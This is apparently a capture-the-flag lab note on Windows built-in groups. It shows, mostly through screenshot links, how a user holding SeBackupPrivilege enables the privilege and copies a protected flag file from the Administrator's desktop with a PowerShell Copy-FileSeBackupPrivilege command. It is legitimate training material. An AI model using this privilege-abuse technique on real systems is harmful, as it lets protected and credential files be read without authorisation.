# [Windows Built-in Groups](Windows%20Built-in%20Groups.md)
### Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt

Imported libraries
![](Screenshot%202026-08-19%20at%2009.02.05.png)

Verified SeBackupPriv
![](Screenshot%202026-08-19%20at%2009.03.41.png)

Lets enable SeBackupPriv
![](Screenshot%202026-08-19%20at%2009.04.17.png)

```powershell
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag1.txt
```
![](Screenshot%202026-08-19%20at%2009.06.32.png)
